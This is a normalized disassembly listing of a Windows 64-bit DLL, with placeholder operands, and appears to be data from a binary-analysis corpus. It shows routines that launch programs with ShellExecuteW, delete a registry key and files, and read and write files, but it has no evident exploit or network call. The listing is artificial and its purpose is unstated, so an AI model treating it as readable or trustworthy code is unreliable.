mov [ rbp + 0x348 ] ax
lea r8d [ rax + 0x14 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x348 ]
call sub_180003930
nop
lea r8 [ rbp + 0x348 ]
lea rdx [ rbp + 0x460 ]
lea rcx [ rbp + 0x640 ]
call sub_1800089c0
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp + 0x5f0 ]
call sub_180018c70
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180008240
nop
cmp [ rbp + 0x608 ] 0x8
jb r-xdata
mov [ rbp + 0x298 ] 0x7
mov [ rbp + 0x290 ] rdi
mov [ rbp + 0x280 ] di
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov rcx [ rbp + 0x280 ]
call j_sub_18002094c#2
mov [ rbp + 0x6a8 ] 0x7
mov [ rbp + 0x6a0 ] rdi
mov [ rbp + 0x690 ] di
cmp [ rbp + 0x298 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x690 ]
call j_sub_18002094c#2
mov [ rbp + 0x5e0 ] 0x7
mov [ rbp + 0x5d8 ] rdi
mov [ rbp + 0x5c8 ] di
cmp [ rbp + 0x4a0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5c8 ]
call j_sub_18002094c#2
mov [ rbp + 0x608 ] 0x7
xor edi edi
mov [ rbp + 0x600 ] rdi
mov [ rbp + 0x5f0 ] di
cmp [ rbp + 0x658 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5f0 ]
call j_sub_18002094c#2
mov rbx rdi
mov rcx rax
call sub_180017520
mov rbx rax
jmp r-xdata
mov [ rbp + 0x298 ] 0x7
mov [ rbp + 0x290 ] rdi
mov [ rbp + 0x280 ] di
cmp [ rbp + 0x6f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x280 ]
call j_sub_18002094c#2
mov rsi [ rsp + 0x38 ]
jmp r-xdata
mov rcx [ rbp + 0x488 ]
call j_sub_18002094c#2
mov rsi [ rsp + 0x38 ]
jmp r-xdata
mov [ rbp + 0x658 ] 0x7
mov [ rbp + 0x650 ] rdi
mov [ rbp + 0x640 ] di
cmp [ rbp + 0x360 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x640 ]
call j_sub_18002094c#2
lea rdx [ rbp + 0x370 ]
call sub_180017bc0
lea r9 [ rsi + 0x68 ]
cmp [ r9 + 0x18 ] 0x8
jb r-xdata
lea rdx [ rbp + 0x3c0 ]
call sub_180017bc0
lea r8 [ rbp + 0x5a0 ]
cmp [ rbp + 0x5b8 ] 0x8
cmovae r8 [ rbp + 0x5a0 ]
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800175a0
mov r8d 0xa
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
mov rsi [ rsp + 0x38 ]
mov rcx rbx
cmp [ rsi + 0x78 ] 0x0
jne r-xdata
mov [ rbp + 0x6f8 ] 0x7
mov [ rbp + 0x6f0 ] rdi
mov [ rbp + 0x6e0 ] di
cmp [ rbp + 0x270 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x6e0 ]
call j_sub_18002094c#2
mov [ rbp + 0x360 ] 0x7
mov [ rbp + 0x358 ] rdi
mov [ rbp + 0x348 ] di
cmp [ rbp + 0x428 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x348 ]
call j_sub_18002094c#2
lea r8 [ rbp + 0x5a0 ]
cmp [ rbp + 0x5b8 ] 0x8
cmovae r8 [ rbp + 0x5a0 ]
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov r9 [ r9 ]
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
xor r9d r9d
mov rdx rax
xor ecx ecx
call [ ShellExecuteW@IAT ]
mov rdi rax
cmp [ rbp + 0x3d8 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rbp + 0x270 ] 0x7
mov [ rbp + 0x268 ] rdi
mov [ rbp + 0x258 ] di
cmp [ rbp + 0x4a0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x258 ]
call j_sub_18002094c#2
mov rcx [ rbp + 0x410 ]
call j_sub_18002094c#2
mov rsi [ rsp + 0x38 ]
jmp r-xdata
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
mov rdx rax
xor ecx ecx
call [ ShellExecuteW@IAT ]
mov rdi rax
cmp [ rbp + 0x388 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rbp + 0x3d8 ] 0x7
xor eax eax
mov [ rbp + 0x3d0 ] rax
mov [ rbp + 0x3c0 ] ax
jmp r-xdata
mov rcx [ rbp + 0x3c0 ]
call j_sub_18002094c#2
mov [ rbp + 0x4a0 ] 0x7
mov [ rbp + 0x498 ] rdi
mov [ rbp + 0x488 ] di
cmp [ rbp + 0x248 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x488 ]
call j_sub_18002094c#2
mov [ rbp + 0x388 ] 0x7
xor eax eax
mov [ rbp + 0x380 ] rax
mov [ rbp + 0x370 ] ax
mov rcx [ rbp + 0x370 ]
call j_sub_18002094c#2
cmp edi 0x20
ja r-xdata
mov [ rbp + 0x248 ] 0x7
mov [ rbp + 0x240 ] rdi
mov [ rbp + 0x230 ] di
cmp [ rbp + 0x360 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x230 ]
call j_sub_18002094c#2
mov [ rbp + 0x248 ] 0x7
xor edi edi
mov [ rbp + 0x240 ] rdi
mov [ rbp + 0x230 ] di
lea r8d [ rdi + 0x7 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x230 ]
call sub_180003930
nop
lea r8 [ rbp + 0x230 ]
lea rdx [ rbp + 0x460 ]
lea rcx [ rbp + 0x4d8 ]
call sub_1800089c0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180008240
nop
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
movsxd rdx edi
lea rcx [ rbp + 0x500 ]
call sub_1800188b0
mov rdi rax
mov [ rbp + 0x270 ] 0x7
xor eax eax
mov [ rbp + 0x268 ] rax
mov [ rbp + 0x258 ] ax
lea r8d [ rax + 0x14 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x258 ]
call sub_180003930
nop
lea r8 [ rbp + 0x258 ]
lea rdx [ rbp + 0x460 ]
lea rcx [ rbp + 0x438 ]
call sub_1800089c0
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp + 0x3e8 ]
call sub_180018c70
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180008240
nop
cmp [ rbp + 0x400 ] 0x8
jb r-xdata
mov [ rbp + 0x360 ] 0x7
mov [ rbp + 0x358 ] rdi
mov [ rbp + 0x348 ] di
cmp [ rbp + 0x2e8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x348 ]
call j_sub_18002094c#2
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] rdi
mov [ rbp + 0x4d8 ] di
cmp [ rbp + 0x248 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
call j_sub_18002094c#2
mov [ rbp + 0x400 ] 0x7
xor edi edi
mov [ rbp + 0x3f8 ] rdi
mov [ rbp + 0x3e8 ] di
cmp [ rbp + 0x450 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3e8 ]
call j_sub_18002094c#2
mov [ rbp + 0x2e8 ] 0x7
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
cmp [ rbp + 0x220 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2d0 ]
call j_sub_18002094c#2
mov [ rbp + 0x248 ] 0x7
mov [ rbp + 0x240 ] rdi
mov [ rbp + 0x230 ] di
mov rcx [ rbp + 0x230 ]
call j_sub_18002094c#2
mov [ rbp + 0x450 ] 0x7
mov [ rbp + 0x448 ] rdi
mov [ rbp + 0x438 ] di
cmp [ rbp + 0x270 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x438 ]
call j_sub_18002094c#2
mov rsi [ rsp + 0x38 ]
lea rcx [ rsi + 0x10 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x2f8 ]
call sub_180008240
mov rcx [ rbp + 0x208 ]
call j_sub_18002094c#2
mov rbx [ rsp + 0x50 ]
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
jmp r-xdata
mov [ rbp + 0x270 ] 0x7
mov [ rbp + 0x268 ] rdi
mov [ rbp + 0x258 ] di
cmp [ rbp + 0x518 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x258 ]
call j_sub_18002094c#2
mov [ rbp + 0x518 ] 0x7
mov [ rbp + 0x510 ] rdi
mov [ rbp + 0x500 ] di
jmp r-xdata
mov rcx [ rbp + 0x500 ]
call j_sub_18002094c#2
test rbx rbx
je r-xdata
sub_18001c280
push rdi
sub rsp 0x20
mov rdi rdx
test rdx rdx
je r-xdata
xor eax eax
add rsp 0x20
pop rdi
retn
mov eax 0xffff
cmp [ rdx + 0x4 ] ax
je r-xdata
mov rcx [ rdx + 0x10 ]
mov rax [ rw-data ]
mov [ rsp + 0x38 ] rbp
lea rbp [ rcx + rax + 0x4 ]
mov edx 0x1
mov [ rsp + 0x40 ] rsi
mov rcx rbp
call sub_180021308
mov rsi rax
test rax rax
jne r-xdata
mov ecx 0x10
mov [ rsp + 0x30 ] rbx
call sub_180021000
mov rbx rax
test rax rax
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
xor ebx ebx
mov [ rax ] 0x0
mov [ rax + 0x8 ] 0x0
jmp r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] rsi
mov [ rbx + 0x8 ] rbp
mov eax [ rdi ]
mov rcx [ rw-data ]
mov rdx rbp
mov [ rsi ] eax
movzx eax [ rdi + 0x4 ]
mov [ rcx + rsi ] ax
add rcx [ rw-data ]
movzx eax [ rdi + 0x6 ]
mov [ rcx + rsi ] al
mov rcx [ rw-data ]
mov r9 [ rdi + 0x10 ]
mov r8 [ rdi + 0x8 ]
sub rdx rcx
lea rcx [ rcx + rsi + 0x4 ]
sub rdx 0x4
call sub_18002134c
cmp [ rbx ] 0x0
jne r-xdata
sub_18001c380
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebp edx
test r8 r8
je r-xdata
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
xor eax eax
add rsp 0x20
pop rdi
retn
cmp r9 [ rw-data ]
jb r-xdata
mov ecx 0x18
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] r12
call sub_180021000
xor ecx ecx
mov rbx rax
test rax rax
je r-xdata
mov rbx rcx
mov [ rax ] ecx
mov eax 0xffff
mov [ rbx + 0x6 ] 0xff
mov [ rbx + 0x4 ] ax
movzx eax [ rw-data ]
mov [ rbx + 0x8 ] rcx
mov [ rbx + 0x7 ] al
mov [ rbx + 0x10 ] rcx
jmp r-xdata
lea r8 [ r12 + rsi ]
mov r9 rdi
mov rdx rdi
mov rcx rax
call sub_18002134c
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov r12 [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov r12 [ rw-data ]
mov [ rbx ] ebp
movzx ecx [ rax + rsi ]
mov rax [ rw-data ]
sub rdi r12
mov [ rbx + 0x4 ] cx
movzx ecx [ rax + rsi ]
mov edx 0x1
mov [ rbx + 0x6 ] cl
mov rcx rdi
call sub_180021308
mov rbp rax
test rax rax
jne r-xdata
mov rax rbx
jmp r-xdata
mov [ rbx + 0x8 ] rbp
mov [ rbx + 0x10 ] rdi
sub_18001c490
mov [ rsp + 0x20 ] rbx
push rbp
sub rsp 0x20
mov rbx rdx
mov rbp rcx
test rdx rdx
jne r-xdata
mov rax [ rcx ]
call [ rax ]
test al al
je r-xdata
xor eax eax
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rbp
retn
mov rcx [ rbx ]
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x40 ] rdi
xor edi edi
test rcx rcx
je r-xdata
mov r8 rdi
mov r8 [ rbx + 0x8 ]
sub r8 0x4
jmp r-xdata
mov rdx rdi
cmp [ rbx + 0x8 ] 0x4
jbe r-xdata
test rcx rcx
je r-xdata
xor eax eax
jmp r-xdata
mov r9 [ rsp + 0x38 ]
lea rcx [ rw-data ]
mov rdx [ r9 + rax - 0xb ]
lea rax [ r9 + rax - 0xb ]
cmp rdx [ rcx ]
jne r-xdata
mov rax [ rw-data ]
lea rdx [ rcx + rax ]
jmp r-xdata
mov rsi [ rsp + 0x30 ]
mov rdi [ rsp + 0x40 ]
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rbp
retn
sbb eax eax
sbb eax 0xffffffff
mov edi eax
movzx edx [ rax + 0x8 ]
cmp dx [ rcx + 0x8 ]
jne r-xdata
mov rax [ rw-data ]
mov rcx [ rbp + 0x10 ]
lea r9 [ rsp + 0x38 ]
sub r8 rax
add rdx rax
call sub_180018290
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx rsi
call sub_18002094c
movzx edx [ rax + 0xa ]
cmp dl [ rcx + 0xa ]
je r-xdata
or edx 0xffffffff
mov rax [ rw-data ]
mov edx [ rcx + rax ]
jmp r-xdata
test edi edi
je r-xdata
add r9 0xfffffffffffffff5
mov r8 rsi
mov rcx rbp
call sub_18001c380
mov rcx rsi
mov rbx rax
call sub_18002094c
mov rax rbx
sub_18001c5b0
mov r8 [ rdx ]
xor eax eax
test r8 r8
je r-xdata
mov r9 rax
mov r9 [ rdx + 0x8 ]
sub r9 0x4
jmp r-xdata
mov rcx [ rcx + 0x10 ]
mov r8 r9
mov rdx rax
jmp sub_180018130
cmp [ rdx + 0x8 ] 0x4
jbe r-xdata
test r8 r8
je r-xdata
mov rax [ rw-data ]
add rax r8
sub_18001c5f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp rcx
mov rcx [ rcx + 0x10 ]
mov rdi r8
mov rsi rdx
or r8d 0xffffffff
xor edx edx
call sub_1800180d0
mov rcx [ rbp + 0x10 ]
mov r9 rdi
mov ebx eax
mov r8 rsi
shr ebx 0x10
xor bx ax
movzx edx bx
call sub_180017f20
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
movzx eax ax
movzx ecx bx
mov rbx [ rsp + 0x30 ]
shl eax 0x10
xor eax ecx
add rsp 0x20
pop rdi
retn
sub_18001c660
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rbp
mov [ rsp + 0x58 ] rsi
mov rsi r8
mov rbp rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
xor edi edi
mov [ rcx + 0x8 ] rdi
lea ecx [ rdi + 0x10 ]
call sub_180021000
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov [ rbx + 0x10 ] rdi
mov rax rbx
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov r8 rsi
mov rdx rbp
mov rcx rax
call sub_180017e90
mov rdi rax
sub_18001c6e0
push rbp
push r12
sub rsp 0x38
mov rbp rdx
mov r12 rcx
test rdx rdx
jne r-xdata
mov [ rsp + 0x50 ] rbx
call sub_18001c280
cmp [ rax ] 0x0
mov rbx rax
jne r-xdata
xor eax eax
add rsp 0x38
pop r12
pop rbp
retn
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x60 ] 0x0
mov rdi [ rax ]
mov [ rsp + 0x20 ] r13
test rdi rdi
je r-xdata
cmp [ rax + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov rax [ rax + 0x8 ]
sub rax 0x4
jmp r-xdata
xor eax eax
mov rbx [ rsp + 0x50 ]
add rsp 0x38
pop r12
pop rbp
retn
xor eax eax
jmp r-xdata
test rdi rdi
je r-xdata
lea r13 [ rax + 0xb ]
mov edx 0x1
mov rcx r13
call sub_180021308
mov rsi rax
test rax rax
je r-xdata
mov rdi [ rsp + 0x28 ]
mov rsi [ rsp + 0x30 ]
mov r13 [ rsp + 0x20 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x38
pop r12
pop rbp
retn
xor r9d r9d
mov r9 [ rbx + 0x8 ]
sub r9 0x4
jmp r-xdata
xor r8d r8d
cmp [ rbx + 0x8 ] 0x4
jbe r-xdata
test rdi rdi
je r-xdata
xor edx edx
mov rdx [ rbx + 0x8 ]
sub rdx 0x4
jmp r-xdata
mov rax [ rw-data ]
lea r8 [ rdi + rax ]
jmp r-xdata
xor eax eax
mov rax [ rbx + 0x8 ]
sub rax 0x4
jmp r-xdata
mov rcx rsi
call sub_18002134c
cmp [ rbx ] 0x0
je r-xdata
test rdi rdi
je r-xdata
mov rcx rbx
call j_sub_18002094c#2
mov rcx [ r12 + 0x10 ]
lea r9 [ rsp + 0x60 ]
mov r8 r13
mov rdx rsi
call sub_1800181a0
mov rcx rsi
mov rdi rax
call sub_18002094c
test rdi rdi
jne r-xdata
call sub_18002094c
mov r9d 0xb
lea rcx [ rax + rsi ]
lea r8 [ rw-data ]
mov edx r9d
call sub_18002134c
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov r8 [ rsp + 0x60 ]
mov rdx rdi
mov rcx r12
call sub_18001c5f0
mov r12 [ rsp + 0x60 ]
mov edx 0x1
add r12 0x8
mov [ rsp + 0x58 ] eax
mov rcx r12
call sub_180021308
mov ecx [ rbp ]
mov r9d 0x4
mov [ rax ] ecx
lea r8 [ rsp + 0x58 ]
lea rcx [ rax + 0x4 ]
mov edx r9d
mov rsi rax
call sub_18002134c
mov rdx [ rsp + 0x60 ]
lea rcx [ rsi + 0x8 ]
mov r9 rdx
mov r8 rdi
call sub_18002134c
mov ecx 0x10
call sub_180021000
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
mov [ rax ] rsi
mov [ rax + 0x8 ] r12
jmp r-xdata
mov rcx rdi
call sub_18002094c
mov rax rbx
sub_18001c8d0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdx [ rcx + 0x70 ]
mov rdi rcx
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov rcx 0xffffffff80000003
call [ SHDeleteKeyW@IAT ]
cmp [ rdi + 0x28 ] 0x8
lea rbx [ rdi + 0x10 ]
jb r-xdata
mov rdx [ rdx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
cmp [ rdi + 0x50 ] 0x8
lea rbx [ rdi + 0x38 ]
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
call [ DeleteFileW@IAT ]
mov rbx [ rbx ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call [ DeleteFileW@IAT ]
mov rbx [ rbx ]
sub_18001c970
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rax [ r--data ]
xor esi esi
mov rbx rcx
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x8 ] rax
cmp [ rcx + 0x88 ] 0x8
mov [ rcx + 0x80 ] rsi
jb r-xdata
lea rax [ rcx + 0x70 ]
mov rax [ rcx + 0x70 ]
jmp r-xdata
mov [ rbx + 0x88 ] 0x7
mov [ rbx + 0x80 ] rsi
mov [ rbx + 0x70 ] si
cmp [ rbx + 0x50 ] 0x8
jb r-xdata
mov rcx [ rcx + 0x70 ]
call j_sub_18002094c#2
mov [ rax ] si
cmp [ rcx + 0x88 ] 0x8
jb r-xdata
mov [ rbx + 0x50 ] 0x7
mov [ rbx + 0x48 ] rsi
mov [ rbx + 0x38 ] si
cmp [ rbx + 0x28 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x38 ]
call j_sub_18002094c#2
mov [ rbx + 0x20 ] rsi
mov [ rbx + 0x28 ] 0x7
mov [ rbx + 0x10 ] si
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x10 ]
call j_sub_18002094c#2
sub_18001ca30
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rbp r8
mov rbx rdx
xor dil dil
xor r12d r12d
cmp rsi 0xffffffffffffffff
jne r-xdata
lea ecx [ rax - 0xc ]
call [ Sleep@IAT ]
inc dil
cmp dil 0x5
jb r-xdata
mov [ rsp + 0x40 ] r12d
mov r9d 0x2
xor r8d r8d
xor edx edx
mov rcx rsi
call [ SetFilePointer@IAT ]
mov r11 [ rbp ]
mov rax [ r11 + 0x8 ]
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x20 ] r12
lea r9 [ rsp + 0x40 ]
mov r8d 0x4
lea rdx [ rsp + 0x44 ]
mov rcx rsi
call [ WriteFile@IAT ]
mov rcx rsi
cmp [ rsp + 0x40 ] 0x4
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx rbx
call sub_1800010b0
mov rcx rax
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x28 ] 0x2
mov [ rsp + 0x20 ] 0x4
xor r9d r9d
xor r8d r8d
mov edx 0xc0000000
call [ CreateFileW@IAT ]
mov rsi rax
call [ GetLastError@IAT ]
cmp eax 0x20
jne r-xdata
mov rax [ rbp ]
mov [ rsp + 0x20 ] r12
lea r9 [ rsp + 0x40 ]
mov r8d [ rsp + 0x44 ]
mov rdx [ rax ]
call [ WriteFile@IAT ]
mov r11d [ rsp + 0x40 ]
mov rcx rsi
cmp [ rsp + 0x44 ] r11d
je r-xdata
call [ CloseHandle@IAT ]
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
call [ CloseHandle@IAT ]
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ CloseHandle@IAT ]
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rdi [ rbp + 0x8 ]
test rdi rdi
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
[ rdi + 0x8 ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
sub_18001cc20
mov r11 rsp
push rsi
push rdi
push r13
sub rsp 0x60
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x58 ] rax
mov rsi r8
mov rbx rdx
mov [ r11 - 0x28 ] rdx
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov rcx rdx
mov rcx [ rdx ]
jmp r-xdata
xor edx edx
mov rcx rax
call [ GetFileSize@IAT ]
mov ecx eax
sub rcx [ rsi ]
cmp rcx 0x5
mov rcx rdi
jae r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor r13d r13d
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
xor r9d r9d
xor r8d r8d
mov edx 0xc0000000
call [ CreateFileW@IAT ]
mov rdi rax
cmp rax 0xffffffffffffffff
jne r-xdata
xor r9d r9d
xor r8d r8d
mov edx [ rsi ]
call [ SetFilePointer@IAT ]
mov rcx rdi
cmp eax 0xffffffff
jne r-xdata
call [ CloseHandle@IAT ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rsp + 0x40 ] r13d
mov [ rsp + 0x44 ] r13d
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x44 ]
mov r8d 0x4
lea rdx [ rsp + 0x40 ]
call [ ReadFile@IAT ]
cmp [ rsp + 0x44 ] 0x4
je r-xdata
call [ CloseHandle@IAT ]
mov [ rsi ] r13
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r13
pop rdi
pop rsi
retn
add [ rsi ] 0x4
movsxd rcx [ rsp + 0x40 ]
mov edx 0x1
call sub_180021308
mov rbp rax
mov rcx rdi
test rax rax
jne r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
nop
jmp r-xdata
call [ DeleteFileW@IAT ]
mov [ rsi ] r13
jmp r-xdata
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x44 ]
mov r8d [ rsp + 0x40 ]
mov rdx rax
call [ ReadFile@IAT ]
movsxd r11 [ rsp + 0x40 ]
cmp r11d [ rsp + 0x44 ]
je r-xdata
call [ CloseHandle@IAT ]
add [ rsi ] 0xfffffffffffffffc
jmp r-xdata
add [ rsi ] r11
mov rcx rdi
call [ CloseHandle@IAT ]
mov ecx 0x10
call sub_180021000
mov rdi rax
test rax rax
je r-xdata
mov rcx rbp
call sub_18002094c
mov rcx rdi
call [ CloseHandle@IAT ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rdi r13
movsxd rax [ rsp + 0x40 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rcx rbx
call sub_180001820
mov rax rdi
xor eax eax
jmp r-xdata
call [ DeleteFileW@IAT ]
mov [ rsi ] r13
mov rcx rbx
call sub_180001820
jmp r-xdata
sub_18001ce40
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ rcx + 0x8 ]
lea rcx [ rsp + 0x20 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_180001ba0
lea r8 [ rbx + 0x58 ]
lea rcx [ rbx - 0x8 ]
lea rdx [ rsp + 0x20 ]
call sub_18001cc20
add rsp 0x50
pop rbx
retn
sub_18001ce90
push rbx
sub rsp 0x50
xor eax eax
mov rbx rcx
lea rdx [ rcx + 0x30 ]
lea rcx [ rsp + 0x20 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
call sub_180001ba0
lea r8 [ rbx + 0x60 ]
lea rcx [ rbx - 0x8 ]
lea rdx [ rsp + 0x20 ]
call sub_18001cc20
add rsp 0x50
pop rbx
retn
sub_18001cee0
mov r11 rsp
mov [ r11 + 0x10 ] rdx
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x20 ] rsi
mov rbx rdx
mov rsi rcx
lea rax [ r11 - 0x40 ]
mov [ r11 + 0x18 ] rax
xor edi edi
mov [ r11 - 0x40 ] rdi
mov [ r11 - 0x38 ] rdi
mov r8 [ rdx + 0x8 ]
mov rdx [ rdx ]
test r8 r8
je r-xdata
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x38 ] di
lea rdx [ rsi + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rsp + 0x38 ]
call sub_180001ba0
lea rcx [ rsi - 0x8 ]
lea r8 [ rsp + 0x28 ]
lea rdx [ rsp + 0x38 ]
call sub_18001ca30
nop
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
